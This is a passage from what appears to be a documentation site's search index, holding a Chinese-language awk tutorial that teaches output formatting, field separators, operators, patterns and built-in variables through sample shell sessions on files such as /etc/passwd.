\u6253\u5370\u5185\u5bb9\u7684\uff0c\u6253\u5370\u7684\u5185\u5bb9\u53ef\u4ee5\u662f\u6587\u4ef6\u4e2d\u7684\uff0c\u4e5f\u53ef\u4ee5\u548c\u6587\u4ef6\u6beb\u65e0\u5173\u7cfb [root@shell shelldoc]# awk '{print}' pass 1 2 3 4 [root@shell shelldoc]# awk '{print $0}' pass 1 2 3 4 [root@shell shelldoc]# awk '{print \"helloha\"}' pass helloha [root@shell shelldoc]# awk '{print \"\u4f60\u597d\"}' pass \u4f60\u597d \u200b \u6ce8\u610f\uff1a\u5b57\u7b26\u4e32\u7528\u53cc\u5f15\u53f7\u5f15\u8d77\u6765\uff0c\u4f46\u662f\u53d8\u91cf\u4e0d\u8981\u5f15($1) \u4f8b\u5b50\uff1a\u5728\u6bcf\u884c\u7684\u4e0b\u4e00\u884c\u6253\u5370\u4e00\u4e2a\u7a7a\u884c \\n\uff1a\u6362\u884c [root@shell shelldoc]# awk '{print $0\"\\n\"}' pass 1 2 3 4 [root@shell shelldoc]# head -1 pass | awk '{print \"class\\nis\\nover\"}' class is over \\t\uff1atab [root@shell shelldoc]# awk -F: '{print $1\"\\t\"$3}' pass root 0 bin 1 daemon 2 adm 3 lp 4 sync 5 shutdown 6 halt 7 mail 8 uucp 10 2\uff09printf \u9ed8\u8ba4\u8f93\u51fa\u65f6\u5019\u6ca1\u6709\u6362\u884c\uff0c\u60f3\u6362\u884c\uff0c\u6307\u5b9a\"\\n\" \u8f93\u51fa\u65f6\u9ed8\u8ba4\u6ca1\u6709\u8f93\u51fa\u5b57\u6bb5\u5206\u9694\u7b26 printf\u4e00\u822c\u60c5\u51b5\u4e0b\u9700\u8981\u6307\u5b9a\u8f93\u51fa\u683c\u5f0f printf \"\u8f93\u51fa\u7684\u5b57\u7b26\u4e32(format)\",item1,item2,......,itemn format\u7684\u6307\u793a\u7b26\u662f\u4ee5%\u5f00\u5934\u7684\uff0c\u540e\u9762\u8ddf\u4e00\u4e2a\u5b57\u7b26\uff0c\u5982\uff1a %s\uff1a\u5b57\u7b26\u4e32 string %d\uff1a\u5341\u8fdb\u5236\u6570 digital %f\uff1a\u6d6e\u70b9\u6570\uff0c\u5c0f\u6570 float %%\uff1a\u8868\u793a%\u672c\u8eab %x\uff1a\u5341\u516d\u8fdb\u5236\u6570 %o\uff1a\u516b\u8fdb\u5236\u6570 %c\uff1a\u5b57\u7b26 [root@shell shelldoc]# awk -F: '{printf \"%s %d\",$1,$3}' pass root 0bin 1daemon 2adm 3lp 4sync 5shutdown 6halt 7mail 8uucp 10[root@shell shelldoc]# awk -F: '{printf \"%s %d\\n\",$1,$3}' pass root 0 bin 1 daemon 2 adm 3 lp 4 sync 5 shutdown 6 halt 7 mail 8 uucp 10 [root@shell shelldoc]# awk -F: '{printf \"\u7528\u6237\u540d\uff1a%s uid:%d\\n\",$1,$3}' pass \u5728%\u548c\u5b57\u7b26\u4e4b\u95f4\u53ef\u4ee5\u6709\u4fee\u9970\u7b26 \u4fee\u9970\u7b26\uff1a N\uff1a\u4ee3\u8868\u6570\u5b57\uff0c\u6307\u5b9a\u8f93\u51fa\u65f6\u7684\u663e\u793a\u5bbd\u5ea6 \u6ce8\u610f\uff1a\u663e\u793a\u5bbd\u5ea6\u7684\u65f6\u5019\u5927\u4e8e\u6216\u8005\u7b49\u4e8e\u8981\u6253\u5370\u7684\u5b57\u6bb5\u4e2d\u6700\u957f\u7684\u90a3\u4e2a\u503c -\uff1a\u5de6\u5bf9\u9f50\uff0c\u9ed8\u8ba4\u53f3\u5bf9\u9f50 %-s %-5s %5s [root@shell shelldoc]# awk -F: '{printf \"username:%10s uid:%d\\n\",$1,$3}' pass [root@shell shelldoc]# awk -F: '{printf \"username:%-10s uid:%d\\n\",$1,$3}' pass [root@shell shelldoc]# awk -F: '{printf \"%s%s\",$1,$3}' pass root0bin1daemon2adm3lp4sync5shutdown6halt7mail8uucp10 \u5bf9\u4e8e%f %7.2f \u663e\u793a\u5bbd\u5ea6\u4e3a7\uff0c\u4fdd\u75592\u4f4d\u5c0f\u6570 %-7.2f \u5de6\u5bf9\u9f50\uff0c\u663e\u793a\u5bbd\u5ea6\u4e3a7\uff0c\u4fdd\u75592\u4f4d\u5c0f\u6570 %.2f \u4fdd\u75592\u4f4d\u5c0f\u6570 [root@shell shelldoc]# echo \"12.345 23.56\" 12.345 23.56 [root@shell shelldoc]# echo \"12.345 23.56\" | awk '{printf \"%d %d\\n\",$1,$2}' //\u53d6\u6574\u4e0d\u56db\u820d\u4e94\u5165 12 23 [root@shell shelldoc]# echo \"12.345 23.56\" | awk '{printf \"%-6.2f%.1f\\n\",$1,$2}' //\u53d6\u5c0f\u6570\u65f6\u5019\u56db\u820d\u4e94\u5165 12.35 23.6 \u200b \u4e09\u3001awk\u7684\u8fd0\u7b97\u7b26 1\u3001\u7b97\u6570\u8fd0\u7b97\u7b26 -x \uff1a\u8d1f\u6570 (+)x \uff1a\u6b63\u6570 + - * / % \uff1a\u53d6\u6a21 ^ \uff1a\u53d6\u5e42 [root@shell shelldoc]# awk '{print $3,$5,$3+$5,$3-$5,$3*$5,$5/$3,$5%$3,2^16}' employees 2\u3001\u5173\u7cfb\u8fd0\u7b97\u7b26 1\uff09\u6570\u503c\u4e4b\u95f4\u7684\u5173\u7cfb\u8fd0\u7b97\u7b26 < >= <= == != \u6253\u5370passwd\u6587\u4ef6\u4e2duid\u5c0f\u4e8e5\u7684\u884c [root@shell shelldoc]# awk -F: '$3<5{print}' /etc/passwd [root@shell shelldoc]# awk -F: '$3<5' /etc/passwd //\u6709\u5b9a\u5740\uff0c\u65e0\u52a8\u4f5c\uff0c\u9ed8\u8ba4\u5c31\u662f\u6253\u5370\u7b26\u5408\u6761\u4ef6\u7684\u884c \u6253\u5370\u7cfb\u7edf\u4e2dgid\u5927\u4e8e\u7b49\u4e8e500\u7684\u7ec4\u540d\u548cgid [root@shell shelldoc]# awk -F: '$3>=500{print $1,$3}' /etc/group 2\uff09\u5b57\u7b26\u4e32\u4e4b\u95f4\u7684\u5173\u7cfb\u8fd0\u7b97 == != \u6253\u5370\u7528\u6237\u540d\u662fbin\u7684\u884c [root@shell shelldoc]# awk -F: '$1==\"bin\"' pass bin:x:1:1:bin:/bin:/sbin/nologin \u6253\u5370\u7528\u6237\u540d\u4e0d\u662fbin\u7684\u884c [root@shell shelldoc]# awk -F: '$1!=\"bin\"' pass x ~ /y/ \u5339\u914d\u6b63\u5219 x !~ /y/ \u4e0d\u5339\u914d\u7684 \u6253\u5370pass\u6587\u4ef6\u4e2d\u540d\u5b57\u4e2d\u5e26o\u7684\u7528\u6237\u540d [root@shell shelldoc]# awk -F: '$1~/o/{print $1}' pass root daemon shutdown \u6253\u5370pass\u6587\u4ef6\u4e2d\u540d\u5b57\u4ee5ro\u5f00\u5934\u7684\u7528\u6237\u540d [root@shell shelldoc]# awk -F: '$1~/^ro/{print $1}' pass root 3\u3001\u903b\u8f91\u8fd0\u7b97\u7b26 \u200b && || ! uid\u5927\u4e8e8\u6216\u8005uid\u5c0f\u4e8e3\u7684\u7528\u6237\u7684\u540d\u5b57\u548cuid [root@shell shelldoc]# awk -F: '$3>8 || $3<3 {print $1,$3}' pass root 0 bin 1 daemon 2 uucp 10 1\uff09\u6253\u5370/etc/fstab\u4e2d\u542b\u6709boot\u7684\u884c [root@shell shelldoc]# awk '/boot/' /etc/fstab UUID=ab73b6db-6cfd-43dd-af99-9848973c7689 /boot ext4 defaults 1 2 [root@shell shelldoc]# awk '/boot/{print}' /etc/fstab UUID=ab73b6db-6cfd-43dd-af99-9848973c7689 /boot ext4 defaults 1 2 [root@shell shelldoc]# awk '/boot/{print $0}' /etc/fstab UUID=ab73b6db-6cfd-43dd-af99-9848973c7689 /boot ext4 defaults 1 2 2\uff09\u6253\u5370pass\u6587\u4ef6\u4e2duid\u57285\u52308\u4e4b\u95f4\u7684\u7528\u6237\u7684\u7528\u6237\u540d\u548cuid [root@shell shelldoc]# awk -F: '$3>=5 && $3<=8{print $1,$3}' pass 3\uff09\u6253\u5370passwd\u6587\u4ef6\u4e2duid\u4e3a10\u7684\u4eba\u7684\u7528\u6237\u540d\uff0cuid\u3001\u5bb6\u76ee\u5f55\u53cashell '$3==10{print $1,$3,$6,$7}' 4\uff09\u6253\u5370\u7528\u6237shell\u662f\u767b\u5f55shell\u7684\u7528\u6237\u540d\u53ca\u5176shell '/sh$/{print $1,$7}' '$7 ~ /sh$/{print $1,$7}' 5\uff09\u6253\u5370uid\u4e0d\u5927\u4e8e5\u7684\u7528\u6237\u540d '!($3>5){print $1}' [root@shell shelldoc]# awk -F: '!($3>5){print $1}' pass \u6ce8\u610f\uff1a\u62ec\u53f7\u6539\u53d8\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7 6\uff09\u4f7f\u7528awk\u4ea4\u6362\u8f93\u51fapass\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u548c\u7b2c\u4e8c\u4e2a\u5b57\u6bb5(\u5176\u4ed6\u5b57\u6bb5\u6b63\u5e38\u8f93\u51fa) [root@shell shelldoc]# awk -F: '{print $2\":\"$1\":\"$3\":\"$4\":\"$5\":\"$6\":\"$7}' pass 7\uff09\u6253\u5370uid\u548cgid\u4e0d\u76f8\u540c\u7684\u7528\u6237\u7684\u7528\u6237\u540d\u3001uid\u548cgid '$3!=$4{print $1,$3,$4}' 8\uff09\u6253\u5370100\u4ee5\u5185\u80fd\u591f\u88ab7\u6574\u9664\uff0c\u53ca\u5305\u542b7\u7684\u6570 \uff08\u9762\u8bd5\u9898\uff09 [root@shell shelldoc]# seq 100 | awk '$1%7==0 || $1 ~ /7/' [root@shell shelldoc]# seq 100 | awk '$1%7==0 || /7/' [root@shell shelldoc]# seq 100 | awk '$0%7==0 || $0 ~ /7/' [root@shell shelldoc]# seq 100 | awk '$0%7==0 || /7/' \u200b 4\u3001\u8d4b\u503c\u8fd0\u7b97\u7b26 \u56db\u3001awk\u7684\u6a21\u5f0f\u5339\u914d\uff08\u5b9a\u5740\uff09 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cawk\u4e0d\u652f\u6301\u884c\u53f7\u5b9a\u5740 \u5e38\u89c1\u7684\u6a21\u5f0f 1\u3001\u7a7a\u6a21\u5f0f \uff1a\u6bcf\u884c\u90fd\u505a\u52a8\u4f5c\u7684\u6a21\u5f0f [root@shell shelldoc]# awk '{print}' pass 2\u3001\u6b63\u5219\u8868\u8fbe\u5f0f \u5355\u4e00\u7684\u6b63\u5219 [root@shell shelldoc]# awk '/^root/{print}' pass \u8303\u56f4\u5b9a\u5740 [root@shell shelldoc]# awk '/^root/,/login$/{print}' pass root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin 3\u3001\u8868\u8fbe\u5f0f \u200b $3 < 10 \u200b $1 ~ /7/ 4\u3001\u7279\u6b8a\u6a21\u5f0f \u200b BEGIN{} \u8bfb\u53d6\u6587\u4ef6\u4e4b\u524d\u505a\uff0c\u53ea\u505a\u4e00\u6b21 \u200b END{} \u8bfb\u53d6\u4e86\u6240\u6709\u6587\u4ef6\u5185\u5bb9\u4e4b\u540e\u624d\u505a\uff0c\u53ea\u505a\u4e00\u6b21 5\u3001NR\u53d8\u91cf \u200b Number of Record \u53ef\u4ee5\u4ee3\u66ff\u884c\u53f7\u7684\u53d8\u91cf [root@shell shelldoc]# awk '2{print}' pass //\u53cd\u4f8b [root@shell shelldoc]# awk 'NR==2{print}' pass //\u6253\u5370\u7b2c2\u884c bin:x:1:1:bin:/bin:/sbin/nologin \u200b \u6253\u5370\u5947\u6570\u884c [root@shell shelldoc]# awk 'NR%2==1' pass \u200b \u6253\u5370\u5076\u6570\u884c [root@shell shelldoc]# awk 'NR%2==0' pass \u200b \u4ece\u7b2c\u4e00\u884c\u5f00\u59cb\uff0c\u6bcf3\u884c\u6253\u5370\u4e00\u6b21 [root@shell shelldoc]# awk 'NR%3==1' pass \u200b \u200b \u200b \u4e94\u3001awk\u7684\u5185\u7f6e\u53d8\u91cf NR\u53d8\u91cf Number of Record \u53ef\u4ee5\u4ee3\u66ff\u884c\u53f7\u7684\u53d8\u91cf [root@shell shelldoc]# awk '2{print}' pass //\u53cd\u4f8b [root@shell shelldoc]# awk 'NR==2{print}' pass //\u6253\u5370\u7b2c2\u884c bin:x:1:1:bin:/bin:/sbin/nologin \u6253\u5370\u5947\u6570\u884c [root@shell shelldoc]# awk 'NR%2==1' pass \u6253\u5370\u5076\u6570\u884c [root@shell shelldoc]# awk 'NR%2==0' pass \u4ece\u7b2c\u4e00\u884c\u5f00\u59cb\uff0c\u6bcf3\u884c\u6253\u5370\u4e00\u6b21 [root@shell shelldoc]# awk 'NR%3==1' pass NF\u53d8\u91cf \u4ee3\u8868\u5217\u6570 [root@iZm5e4bxrlofss5j30ztx2Z ~]# awk -F: '{print $NF}' passwd /bin/bash /sbin/nologin FS\u53d8\u91cf \u4ee3\u8868\u5206\u9694\u7b26 [root@iZm5e4bxrlofss5j30ztx2Z ~]# awk 'BEGIN{FS=\"[:\\t]\"} {print $1}' passwd root bin OFS\u53d8\u91cf \u8f93\u51fa\u5206\u5272\u7b26\u53f7 [root@iZm5e4bxrlofss5j30ztx2Z ~]# awk 'BEGIN{FS=\"[:\\t]\";OFS=\"@\"} {print $1,$2}' passwd root@x bin@x RS\uff1aRecord Separator\uff0c\u8bb0\u5f55\u5206\u9694\u7b26 \u4e00\u822c\u662f\\n [root@iZm5e4bxrlofss5j30ztx2Z ~]# echo a b oo c d |awk 'BEGIN{RS=\"oo\"} {print $1,$2}' \\\\oo\u7528\u6765\u533a\u5206\u8bb0\u5f55 a b c d ORS\uff1aOutput Record Separate\uff0c\u8f93\u51fa\u5f53\u524d\u8bb0\u5f55\u5206\u9694\u7b26 \u4e00\u822c\u662f\\n [root@iZm5e4bxrlofss5j30ztx2Z ~]# echo a b oo c d |awk 'BEGIN{ ORS=\"PP\"} {print $1,$2}' a bPP[root@iZm5e4bxrlofss5j30ztx2Z ~]# ARGV \u547d\u4ee4\u884c\u53c2\u6570 ARGC\u4ee3\u8868\u547d\u4ee4\u884c\u7b2c\u51e0\u4e2a [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt 1 2 3 4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{for(x=0;x<=ARGC;x++)print x,ARGC,ARGV[x]}' 1.txt 88 99 0 4 awk 1 4 1.txt 2 4 88 3 4 99 4 4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{for(x=1;x<=ARGC;x++)print x,ARGC,ARGV[x]}' 1.txt 88 99 1 4 1.txt 2 4 88 3 4 99 4 4 ENVIRON \u73af\u5883\u53d8\u91cf [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{for(env in ENVIRON)print env,ENVIRON[env]}' AWKPATH .:/usr/share/awk LANG en_US.UTF-8 HISTSIZE 1000 XDG_RUNTIME_DIR /run/user/0 USER root \u6216\u8005\u76f4\u63a5\u8bbf\u95ee\u67d0\u4e2a\u53d8\u91cf [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print ENVIRON[\"HOSTNAME\"]}' 1.txt iZbp1ealzv6zqhd71bns8sZ awk\u7684\u53d8\u91cf [root@iZm5e4bxrlofss5j30ztx2Z ~]# echo a b c d | awk 'BEGIN{one=1;two=2}{print $(one + two)}' c \u8bbe\u7f6e\u9000\u51fa\u7801 [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat my_flask.py |awk '{print $0;exit 5}' # -*- coding: utf-8 -* [root@iZbp1ealzv6zqhd71bns8sZ ~]# echo $? 5 [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat my_flask.py |awk 'NR==1{print $0}END{exit 6}' # -*- coding: utf-8 -* [root@iZbp1ealzv6zqhd71bns8sZ ~]# echo $? 6 [root@iZbp1ealzv6zqhd71bns8sZ ~]# \u200b \u200b \u200b","title":"\u57fa\u7840\u8bed\u6cd5"},{"location":"programming_language/awk/awk/#awk","text":"AWK \u662f\u4e00\u79cd\u4f18\u826f\u7684 \u6587\u672c\u5904\u7406 \u5de5\u5177\uff0c Linux \u53ca Unix \u73af\u5883\u4e2d\u73b0\u6709\u7684\u529f\u80fd\u6700\u5f3a\u5927\u7684 \u6570\u636e\u5904\u7406 \u5f15\u64ce\u4e4b\u4e00\u3002\u8fd9\u79cd\u7f16\u7a0b\u53ca\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff08\u5176\u540d\u79f0\u5f97\u81ea\u4e8e\u5b83\u7684\u521b\u59cb\u4eba \u963f\u5c14\u4f5b\u96f7\u5fb7\u00b7\u827e\u4faf \u3001 \u5f7c\u5f97\u00b7\u6e29\u4f2f\u683c \u548c \u5e03\u83b1\u6069\u00b7\u67ef\u6797\u6c49 \u59d3\u6c0f\u7684\u9996\u4e2a\u5b57\u6bcd\uff09\u7684\u6700\u5927\u529f\u80fd\u53d6\u51b3\u4e8e\u4e00\u4e2a\u4eba\u6240\u62e5\u6709\u7684\u77e5\u8bc6\u3002AWK\u63d0\u4f9b\u4e86\u6781\u5176\u5f3a\u5927\u7684\u529f\u80fd\uff1a\u53ef\u4ee5\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\uff0c\u6837\u5f0f\u88c5\u5165\u3001\u6d41\u63a7\u5236\u3001\u6570\u5b66\u8fd0\u7b97\u7b26\u3001\u8fdb\u7a0b\u63a7\u5236\u8bed\u53e5\u751a\u81f3\u4e8e\u5185\u7f6e\u7684\u53d8\u91cf\u548c\u51fd\u6570\u3002\u5b83\u5177\u5907\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u8bed\u8a00\u6240\u5e94\u5177\u6709\u7684\u51e0\u4e4e\u6240\u6709\u7cbe\u7f8e\u7279\u6027\u3002\u5b9e\u9645\u4e0aAWK\u7684\u786e\u62e5\u6709\u81ea\u5df1\u7684\u8bed\u8a00\uff1aAWK \u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00 \uff0c\u4e09\u4f4d\u521b\u5efa\u8005\u5df2\u5c06\u5b83\u6b63\u5f0f\u5b9a\u4e49\u4e3a\u201c\u6837\u5f0f\u626b\u63cf\u548c\u5904\u7406\u8bed\u8a00\u201d\u3002\u5b83\u5141\u8bb8\u521b\u5efa\u7b80\u77ed\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u7a0b\u5e8f\u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\u3001\u4e3a\u6570\u636e\u6392\u5e8f\u3001\u5904\u7406\u6570\u636e\u3001\u5bf9\u8f93\u5165\u6267\u884c\u8ba1\u7b97\u4ee5\u53ca\u751f\u6210\u62a5\u8868\uff0c\u8fd8\u6709\u65e0\u6570\u5176\u4ed6\u7684\u529f\u80fd\u3002gawk\u662fAWK\u7684GNU\u7248\u672c\u3002 \u6700\u7b80\u5355\u5730\u8bf4\uff0cAWK\u662f\u4e00\u79cd\u7528\u4e8e\u5904\u7406\u6587\u672c\u7684\u7f16\u7a0b\u8bed\u8a00\u5de5\u5177\u3002AWK\u5728\u5f88\u591a\u65b9\u9762\u7c7b\u4f3c\u4e8e Unix shell \u7f16\u7a0b\u8bed\u8a00\uff0c\u5c3d\u7ba1AWK\u5177\u6709\u5b8c\u5168\u5c5e\u4e8e\u5176\u672c\u8eab\u7684\u8bed\u6cd5\u3002\u5b83\u7684\u8bbe\u8ba1\u601d\u60f3\u6765\u6e90\u4e8e SNOBOL4 \u3001 sed \u3001Marc Rochkind\u8bbe\u8ba1\u7684\u6709\u6548\u6027\u8bed\u8a00\u3001\u8bed\u8a00\u5de5\u5177 yacc \u548c lex \uff0c\u5f53\u7136\u8fd8\u4ece C\u8bed\u8a00 \u4e2d\u83b7\u53d6\u4e86\u4e00\u4e9b\u4f18\u79c0\u7684\u601d\u60f3\u3002\u5728\u6700\u521d\u521b\u9020AWK\u65f6\uff0c\u5176\u76ee\u7684\u662f\u7528\u4e8e\u6587\u672c\u5904\u7406\uff0c\u5e76\u4e14\u8fd9\u79cd\u8bed\u8a00\u7684\u57fa\u7840\u662f\uff0c\u53ea\u8981\u5728\u8f93\u5165\u6570\u636e\u4e2d\u6709\u6a21\u5f0f\u5339\u914d\uff0c\u5c31\u6267\u884c\u4e00\u7cfb\u5217\u6307\u4ee4\u3002\u8be5\u5b9e\u7528\u5de5\u5177\u626b\u63cf\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u884c\uff0c\u67e5\u627e\u4e0e\u547d\u4ee4\u884c\u4e2d\u6240\u7ed9\u5b9a\u5185\u5bb9\u76f8\u5339\u914d\u7684\u6a21\u5f0f\u3002\u5982\u679c\u53d1\u73b0\u5339\u914d\u5185\u5bb9\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u4e2a\u7f16\u7a0b\u6b65\u9aa4\u3002\u5982\u679c\u627e\u4e0d\u5230\u5339\u914d\u5185\u5bb9\uff0c\u5219\u7ee7\u7eed\u5904\u7406\u4e0b\u4e00\u884c\u3002 AWK - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u529f\u80fd\uff1a\u5904\u7406\u6587\u672c\u6587\u4ef6\uff0c\u5bf9\u6587\u672c\u6570\u636e\u8fdb\u884c\u6c47\u603b\u548c\u5904\u7406\uff0c\u751f\u6210\u62a5\u544a\uff0c\u5bf9\u6587\u4ef6\u8fdb\u884c\u6392\u7248 [root@shell shelldoc]# which awk /bin/awk [root@shell shelldoc]# ll /bin/awk lrwxrwxrwx. 1 root root 4 Jul 22 15:36 /bin/awk -> gawk [root@shell shelldoc]# ll /bin/gawk -rwxr-xr-x. 1 root root 382456 Jul 4 2012 /bin/gawk awk\u5de5\u4f5c\u8fc7\u7a0b\uff0c\u4e00\u884c\u4e00\u884c\u5904\u7406 \u5c06\u6587\u672c\u6587\u4ef6\u7684\u5185\u5bb9\u9010\u884c\u626b\u63cf\uff0c\u5c06\u6574\u884c\u7684\u5185\u5bb9\u4fdd\u5b58\u5230\u53d8\u91cf$0\u4e2d \u6309\u7167\u6307\u5b9a\u7684\u5206\u9694\u7b26\u5c06\u8f93\u5165\u7684\u884c\u5207\u6210\u82e5\u5e72\u7684\u5217(\u5b57\u6bb5)\uff0c\u5b58\u5165$1\uff0c$2\uff0c$3....\u53d8\u91cf\u4e2d\uff0c\u518d\u4f7f\u7528\u547d\u4ee4(print/printf)\u5c06\u53d8\u91cf\u6253\u5370\u8f93\u51fa\uff0c\u518d\u8bfb\u53d6\u4e0b\u4e00\u884c\uff0c\u76f4\u5230\u6587\u4ef6\u90fd\u8bfb\u53d6\u5b8c\u6bd5\uff0cawk\u7ed3\u675f\u3002 \u9ed8\u8ba4\u7684\u8f93\u5165\u5206\u9694\u7b26\uff1a\u7a7a\u767d \u53d6\u51fa\u672c\u673a\u7684IP\u5730\u5740 [root@shell shelldoc]# ifconfig eth0 | grep -i bcast | awk '{print $2}' addr:172.16.254.200 [root@shell shelldoc]# ifconfig eth0 | grep -i bcast | awk '{print $2}' | awk -F: '{print $2}' 172.16.254.200","title":"Awk"},{"location":"programming_language/awk/awk/#awk_1","text":"awk [\u9009\u9879] '/\u6a21\u5f0f\u5339\u914d(\u5b9a\u5740)/{\u52a8\u4f5c1\uff1b\u52a8\u4f5c2\uff1b....}' \u6587\u4ef6\u5217\u8868 -f\uff1a\u6307\u5b9a\u6267\u884c\u7684awk\u811a\u672c\u7684 -F\uff1a\u6307\u5b9a\u5b57\u6bb5\u5206\u9694\u7b26","title":"\u4e00\u3001awk \u8bed\u6cd5"},{"location":"programming_language/awk/awk/#_1","text":"\u5206\u9694\u7b26\u53ef\u4ee5\u662f\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u548c\u7a7a\u767d\uff0c\u53ef\u4ee5\u540c\u65f6\u6307\u5b9a\u591a\u4e2a\u5206\u9694\u7b26","title":"\u5206\u9694\u7b26"},{"location":"programming_language/awk/awk/#1","text":"[root@shell shelldoc]# awk -F \":\" '{print $1}' pass","title":"1\uff09\u5355\u4e2a\u7b26\u53f7\u4f5c\u4e3a\u5206\u9694\u7b26"},{"location":"programming_language/awk/awk/#2","text":":/ [root@shell shelldoc]# awk -F\":/\" '{print $1}' pass | head -3 root:x:0:0:root bin:x:1:1:bin daemon:x:2:2:daemon","title":"2\uff09\u590d\u5408\u5206\u9694\u7b26  \u591a\u4e2a\u5b57\u7b26\u770b\u6210\u4e00\u4e2a"},{"location":"programming_language/awk/awk/#3","text":"\uff1a / [root@shell shelldoc]# awk -F\"[:/]\" '{print $8}' pass","title":"3\uff09\u540c\u65f6\u6307\u5b9a\u591a\u4e2a\u5206\u9694\u7b26"},{"location":"programming_language/awk/awk/#4","text":"[root@shell shelldoc]# awk -F \"\" '{print $1,$2}' pass -F\u548c\u53cc\u5f15\u53f7\u4e4b\u95f4\u5fc5\u6709\u7a7a\u683c","title":"4\uff09\u4ee5\u7a7a\u4e3a\u5206\u9694\u7b26\uff0c\u6253\u5370\u6bcf\u884c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u548c\u7b2c\u4e8c\u4e2a\u5b57\u7b26"},{"location":"programming_language/awk/awk/#awk_2","text":"","title":"\u4e8c\u3001awk\u8f93\u51fa"},{"location":"programming_language/awk/awk/#1print","text":"print\u8f93\u51fa\u65f6\u6709\u6362\u884c \u6253\u5370\u5b57\u6bb5\u65f6\uff0c\u5982\u679c\u7528\u9017\u53f7\u5206\u9694\u591a\u4e2a\u5b57\u6bb5\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u5c31\u662f\u4ee5\u7a7a\u767d\u4e3a\u5206\u9694\u7b26 print\u65f6\u5019\uff0c\u540e\u9762\u4e0d\u52a0\u5b57\u6bb5\uff0c\u9ed8\u8ba4\u6253\u5370\u6574\u884c \u200b \u6253\u5370\u5185\u5bb9\u7684\uff0c\u6253\u5370\u7684\u5185\u5bb9\u53ef\u4ee5\u662f\u6587\u4ef6\u4e2d\u7684\uff0c\u4e5f\u53ef\u4ee5\u548c\u6587\u4ef6\u6beb\u65e0\u5173\u7cfb [root@shell shelldoc]# awk '{print}' pass 1 2 3 4 [root@shell shelldoc]# awk '{print $0}' pass 1 2 3 4 [root@shell shelldoc]# awk '{print \"helloha\"}' pass helloha [root@shell shelldoc]# awk '{print \"\u4f60\u597d\"}' pass \u4f60\u597d \u200b \u6ce8\u610f\uff1a\u5b57\u7b26\u4e32\u7528\u53cc\u5f15\u53f7\u5f15\u8d77\u6765\uff0c\u4f46\u662f\u53d8\u91cf\u4e0d\u8981\u5f15($1) \u4f8b\u5b50\uff1a\u5728\u6bcf\u884c\u7684\u4e0b\u4e00\u884c\u6253\u5370\u4e00\u4e2a\u7a7a\u884c \\n\uff1a\u6362\u884c [root@shell shelldoc]# awk '{print $0\"\\n\"}' pass 1 2 3 4 [root@shell shelldoc]# head -1 pass | awk '{print \"class\\nis\\nover\"}' class is over \\t\uff1atab [root@shell shelldoc]# awk -F: '{print $1\"\\t\"$3}' pass root 0 bin 1 daemon 2 adm 3 lp 4 sync 5 shutdown 6 halt 7 mail 8 uucp 10","title":"1\uff09print"},{"location":"programming_language/awk/awk/#2printf","text":"\u9ed8\u8ba4\u8f93\u51fa\u65f6\u5019\u6ca1\u6709\u6362\u884c\uff0c\u60f3\u6362\u884c\uff0c\u6307\u5b9a\"\\n\" \u8f93\u51fa\u65f6\u9ed8\u8ba4\u6ca1\u6709\u8f93\u51fa\u5b57\u6bb5\u5206\u9694\u7b26 printf\u4e00\u822c\u60c5\u51b5\u4e0b\u9700\u8981\u6307\u5b9a\u8f93\u51fa\u683c\u5f0f printf \"\u8f93\u51fa\u7684\u5b57\u7b26\u4e32(format)\",item1,item2,......,itemn format\u7684\u6307\u793a\u7b26\u662f\u4ee5%\u5f00\u5934\u7684\uff0c\u540e\u9762\u8ddf\u4e00\u4e2a\u5b57\u7b26\uff0c\u5982\uff1a %s\uff1a\u5b57\u7b26\u4e32 string %d\uff1a\u5341\u8fdb\u5236\u6570 digital %f\uff1a\u6d6e\u70b9\u6570\uff0c\u5c0f\u6570 float %%\uff1a\u8868\u793a%\u672c\u8eab %x\uff1a\u5341\u516d\u8fdb\u5236\u6570 %o\uff1a\u516b\u8fdb\u5236\u6570 %c\uff1a\u5b57\u7b26 [root@shell shelldoc]# awk -F: '{printf \"%s %d\",$1,$3}' pass root 0bin 1daemon 2adm 3lp 4sync 5shutdown 6halt 7mail 8uucp 10[root@shell shelldoc]# awk -F: '{printf \"%s %d\\n\",$1,$3}' pass root 0 bin 1 daemon 2 adm 3 lp 4 sync 5 shutdown 6 halt 7 mail 8 uucp 10 [root@shell shelldoc]# awk -F: '{printf \"\u7528\u6237\u540d\uff1a%s uid:%d\\n\",$1,$3}' pass \u5728%\u548c\u5b57\u7b26\u4e4b\u95f4\u53ef\u4ee5\u6709\u4fee\u9970\u7b26 \u4fee\u9970\u7b26\uff1a N\uff1a\u4ee3\u8868\u6570\u5b57\uff0c\u6307\u5b9a\u8f93\u51fa\u65f6\u7684\u663e\u793a\u5bbd\u5ea6 \u6ce8\u610f\uff1a\u663e\u793a\u5bbd\u5ea6\u7684\u65f6\u5019\u5927\u4e8e\u6216\u8005\u7b49\u4e8e\u8981\u6253\u5370\u7684\u5b57\u6bb5\u4e2d\u6700\u957f\u7684\u90a3\u4e2a\u503c -\uff1a\u5de6\u5bf9\u9f50\uff0c\u9ed8\u8ba4\u53f3\u5bf9\u9f50 %-s %-5s %5s [root@shell shelldoc]# awk -F: '{printf \"username:%10s 